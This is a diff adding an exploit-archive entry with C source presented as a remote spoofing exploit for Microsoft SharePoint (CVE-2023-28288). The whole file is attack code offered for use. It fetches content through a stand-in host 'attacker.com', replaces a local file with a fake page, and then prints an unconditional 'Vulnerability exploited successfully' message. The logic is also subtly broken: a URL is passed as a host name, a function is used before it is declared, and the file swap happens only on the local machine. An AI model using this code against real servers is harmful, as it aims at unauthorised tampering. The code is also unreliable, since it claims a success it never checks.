@@ -1,0 +1,161 @@
+id: 38815
+date: 06/26/2023
+title: Microsoft SharePoint Enterprise Server 2016 - Spoofing Exploit
+author: Amirhossein Bahramizadeh
+cves: CVE-2023-28288
+
+// Exploit Title: Microsoft SharePoint Enterprise Server 2016 - Spoofing
+// country: Iran
+// Exploit Author: Amirhossein Bahramizadeh
+// Category : Remote
+// Vendor Homepage:
+// Microsoft SharePoint Foundation 2013 Service Pack 1
+// Microsoft SharePoint Server Subscription Edition
+// Microsoft SharePoint Enterprise Server 2013 Service Pack 1
+// Microsoft SharePoint Server 2019
+// Microsoft SharePoint Enterprise Server 2016
+// Tested on: Windows/Linux
+// CVE : CVE-2023-28288
+
+#include <windows.h>
+#include <stdio.h>
+
+
+// The vulnerable SharePoint server URL
+const char *server_url = "http://example.com/";
+
+// The URL of the fake SharePoint server
+const char *fake_url = "http://attacker.com/";
+
+// The vulnerable SharePoint server file name
+const char *file_name = "vuln_file.aspx";
+
+// The fake SharePoint server file name
+const char *fake_file_name = "fake_file.aspx";
+
+int main()
+{
+    HANDLE file;
+    DWORD bytes_written;
+    char file_contents[1024];
+
+    // Create the fake file contents
+    sprintf(file_contents, "<html><head></head><body><p>This is a fake file.</p></body></html>");
+
+    // Write the fake file to disk
+    file = CreateFile(fake_file_name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (file == INVALID_HANDLE_VALUE)
+    {
+        printf("Error creating fake file: %d\n", GetLastError());
+        return 1;
+    }
+    if (!WriteFile(file, file_contents, strlen(file_contents), &bytes_written, NULL))
+    {
+        printf("Error writing fake file: %d\n", GetLastError());
+        CloseHandle(file);
+        return 1;
+    }
+    CloseHandle(file);
+
+    // Send a request to the vulnerable SharePoint server to download the file
+    sprintf(file_contents, "%s%s", server_url, file_name);
+    file = CreateFile(file_name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (file == INVALID_HANDLE_VALUE)
+    {
+        printf("Error creating vulnerable file: %d\n", GetLastError());
+        return 1;
+    }
+    if (!InternetReadFileUrl(file_contents, file))
+    {
+        printf("Error downloading vulnerable file: %d\n", GetLastError());
+        CloseHandle(file);
+        return 1;
+    }
+    CloseHandle(file);
+
+    // Replace the vulnerable file with the fake file
+    if (!DeleteFile(file_name))
+    {
+        printf("Error deleting vulnerable file: %d\n", GetLastError());
+        return 1;
+    }
+    if (!MoveFile(fake_file_name, file_name))
+    {
+        printf("Error replacing vulnerable file: %d\n", GetLastError());
+        return 1;
+    }
+
+    // Send a request to the vulnerable SharePoint server to trigger the vulnerability
+    sprintf(file_contents, "%s%s", server_url, file_name);
+    if (!InternetReadFileUrl(file_contents, NULL))
+    {
+        printf("Error triggering vulnerability: %d\n", GetLastError());
+        return 1;
+    }
+
+    // Print a message indicating that the vulnerability has been exploited
+    printf("Vulnerability exploited successfully.\n");
+
+    return 0;
+}
+
+BOOL InternetReadFileUrl(const char *url, HANDLE file)
+{
+    HINTERNET internet, connection, request;
+    DWORD bytes_read;
+    char buffer[1024];
+
+    // Open an Internet connection
+    internet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (internet == NULL)
+    {
+        return FALSE;
+    }
+
+    // Connect to the server
+    connection = InternetConnect(internet, fake_url, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (connection == NULL)
+    {
+        InternetCloseHandle(internet);
+        return FALSE;
+    }
+
+    // Send the HTTP request
+    request = HttpOpenRequest(connection, "GET", url, NULL, NULL, NULL, 0, 0);
+    if (request == NULL)
+    {
+        InternetCloseHandle(connection);
+        InternetCloseHandle(internet);
+        return FALSE;
+    }
+    if (!HttpSendRequest(request, NULL, 0, NULL, 0))
+    {
+        InternetCloseHandle(request);
+        InternetCloseHandle(connection);
+        InternetCloseHandle(internet);
+        return FALSE;
+    }
+
+    // Read the response data
+    while (InternetReadFile(request, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0)
+    {
+        if (file != NULL)
+        {
+            // Write the data to disk
+            if (!WriteFile(file, buffer, bytes_read, &bytes_read, NULL))
+            {
+                InternetCloseHandle(request);
+                InternetCloseHandle(connection);
+                InternetCloseHandle(internet);
+                return FALSE;
+            }
+        }
+    }
+
+    InternetCloseHandle(request);
+    InternetCloseHandle(connection);
+    InternetCloseHandle(internet);
+    return TRUE;
+}
+
+#  0day.today [2023-07-03]  #
